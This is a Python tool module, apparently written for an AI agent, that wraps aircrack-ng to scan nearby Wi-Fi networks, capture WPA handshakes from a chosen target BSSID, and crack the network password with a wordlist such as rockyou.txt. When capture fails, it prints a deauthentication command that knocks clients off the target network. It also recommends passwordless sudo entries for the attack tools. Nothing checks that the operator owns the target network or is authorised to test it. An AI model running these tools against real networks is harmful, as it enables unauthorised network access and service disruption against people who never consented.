"""
WiFi Cracking Module — tool implementations.

Tools provided: wifi_scan, wifi_capture, wifi_crack
Dependencies: aircrack-ng suite (airodump-ng, aireplay-ng, aircrack-ng)

All tools run via subprocess and handle errors gracefully.
If dependencies are missing, tools return clear error messages.
"""

import subprocess
import os
import glob
import shlex
from pathlib import Path


def sudo_available() -> str:
    """v5.2: check if passwordless sudo works; if not, say so honestly
    instead of silently dead-ending at a password prompt that never appears."""
    import subprocess

    try:
        r = subprocess.run(["sudo", "-n", "true"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            return "passwordless sudo: YES — monitor mode and packet capture available"
        return (
            "passwordless sudo: NO — wifi tools need root. Options:\n"
            "  1. sudo visudo: add 'user ALL=(ALL) NOPASSWD: /usr/sbin/airodump-ng, /usr/sbin/aireplay-ng, /usr/bin/aircrack-ng'\n"
            "  2. run the agent as root (not recommended)\n"
            "  3. use a dedicated wifi adapter in a VM with USB passthrough"
        )
    except FileNotFoundError:
        return "Error: sudo not installed — wifi tools unavailable"
    except subprocess.TimeoutExpired:
        return "Error: sudo check timed out"


def _find_interface():
    """Auto-detect the first wireless interface."""
    # macOS
    try:
        r = subprocess.run("networksetup -listallhardwareports", shell=True, capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "Wi-Fi" in line or "AirPort" in line:
                idx = r.stdout.splitlines().index(line)
                if idx + 1 < len(r.stdout.splitlines()):
                    next_line = r.stdout.splitlines()[idx + 1]
                    if "Device:" in next_line:
                        return next_line.split("Device:")[-1].strip()
    except Exception:
        pass

    # Linux
    try:
        r = subprocess.run(
            "iw dev 2>/dev/null | grep Interface | awk '{print $2}'",
            shell=True,
            capture_output=True,
            text=True,
            timeout=5,
        )
        for line in r.stdout.strip().splitlines():
            if line.strip():
                return line.strip()
    except Exception:
        pass

    return "wlan0"  # fallback


def _check_tool(tool_name):
    """Check if a CLI tool is available on PATH."""
    try:
        r = subprocess.run(f"which {shlex.quote(tool_name)}", shell=True, capture_output=True, text=True, timeout=3)
        return bool(r.stdout.strip())
    except Exception:
        return False


def wifi_scan(interface=None):
    """Scan for nearby WiFi networks.

    Args:
        interface: Wireless interface name. Auto-detects if None.

    Returns:
        Text listing of networks with BSSID, channel, signal, ESSID, encryption.
    """
    iface = interface or _find_interface()

    if not _check_tool("airodump-ng"):
        return (
            "Error: aircrack-ng suite not installed.\n"
            "Install: sudo apt install aircrack-ng (Linux) or brew install aircrack-ng (macOS)\n"
            "Note: Monitor mode requires root/sudo on Linux."
        )

    # Quick scan: 5 seconds, output to stdout
    cmd = f"sudo airodump-ng {shlex.quote(iface)} --output-format csv -w /tmp/wifi_scan --write-interval 1 2>&1"
    try:
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
    except subprocess.TimeoutExpired:
        # Expected — airodump runs until killed
        pass
    except FileNotFoundError:
        return "Error: airodump-ng not found. Install aircrack-ng first."

    # Parse the CSV output
    csv_file = "/tmp/wifi_scan-01.csv"
    if not os.path.exists(csv_file):
        return "Error: airodump-ng did not produce output. Check interface and permissions."

    try:
        lines = Path(csv_file).read_text(encoding="utf-8", errors="replace").splitlines()
    except Exception:
        return "Error: Could not read scan output."

    networks = []
    in_ap_section = False
    for line in lines:
        line = line.strip()
        if "BSSID" in line and "channel" in line:
            in_ap_section = True
            continue
        if in_ap_section and line.startswith("Station MAC"):
            break
        if in_ap_section and line and "," in line:
            parts = line.split(",")
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                speed = parts[4].strip()
                privacy = parts[5].strip()
                essid = parts[13].strip()
                if bssid and essid:
                    networks.append(f"  {essid:<25} BSSID: {bssid}  CH: {channel}  ENC: {privacy or 'OPEN'}")

    # Cleanup
    for f in glob.glob("/tmp/wifi_scan*"):
        try:
            os.remove(f)
        except Exception:
            pass

    if not networks:
        return f"No networks found on interface {iface}. Try with sudo and ensure interface supports monitor mode."

    return f"WiFi networks on {iface}:\n" + "\n".join(networks)


def wifi_capture(bssid, channel, interface=None, timeout=60):
    """Capture a WPA handshake from a target network.

    Args:
        bssid:     Target BSSID (MAC address)
        channel:   Channel to listen on
        interface: Wireless interface. Auto-detects if None.
        timeout:   Max seconds to wait for handshake

    Returns:
        Path to capture file or error message.
    """
    if not bssid:
        return "Error: BSSID is required for capture."
    if not channel:
        return "Error: Channel is required for capture."

    iface = interface or _find_interface()

    if not _check_tool("airodump-ng"):
        return "Error: aircrack-ng suite not installed."

    output_file = f"/tmp/wpa_capture_{bssid.replace(':', '')}"
    cmd = (
        f"sudo airodump-ng --bssid {shlex.quote(bssid)} "
        f"--channel {shlex.quote(str(channel))} "
        f"-w {shlex.quote(output_file)} "
        f"{shlex.quote(iface)} 2>&1"
    )

    try:
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=int(timeout) + 5)
    except subprocess.TimeoutExpired:
        pass
    except FileNotFoundError:
        return "Error: airodump-ng not found."

    cap_file = f"{output_file}-01.cap"
    if os.path.exists(cap_file):
        # Check if handshake was captured
        check = subprocess.run(
            f"aircrack-ng {shlex.quote(cap_file)} 2>&1 | grep -c 'handshake' || true",
            shell=True,
            capture_output=True,
            text=True,
            timeout=5,
        )
        handshakes = check.stdout.strip()
        if handshakes and handshakes != "0":
            return (
                f"[done] Handshake captured: {cap_file}\n"
                f"Network: {bssid} | Channel: {channel}\n"
                f"Next: use wifi_crack to attempt password recovery."
            )
        else:
            return (
                f"Capture file created ({cap_file}) but no handshake detected.\n"
                f"Try wifi_capture again or use deauth to force a client to reconnect:\n"
                f"  sudo aireplay-ng --deauth 5 -a {bssid} {iface}"
            )
    return f"Capture failed. Check interface {iface} supports monitor mode and you have root."


def wifi_crack(handshake_file, wordlist):
    """Attempt to crack a WPA handshake using a wordlist.

    Args:
        handshake_file: Path to the .cap file with captured handshake
        wordlist:       Path to wordlist file (e.g. rockyou.txt)

    Returns:
        Cracked password or failure message.
    """
    if not handshake_file or not os.path.exists(handshake_file):
        return f"Error: Handshake file not found: {handshake_file}"
    if not wordlist or not os.path.exists(wordlist):
        return f"Error: Wordlist not found: {wordlist}"

    if not _check_tool("aircrack-ng"):
        return "Error: aircrack-ng not installed."

    cmd = f"aircrack-ng {shlex.quote(handshake_file)} -w {shlex.quote(wordlist)} 2>&1"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return "Error: Cracking timed out (120s limit). Try a smaller wordlist or run manually."

    output = result.stdout
    if "KEY FOUND!" in output:
        for line in output.splitlines():
            if "KEY FOUND!" in line:
                key = line.split("KEY FOUND!")[-1].strip().strip("[]").strip()
                return f"[done] KEY FOUND: {key}\n\nFull output:\n{output[-500:]}"
    return f"No key found in wordlist.\n\nLast output:\n{output[-500:]}"
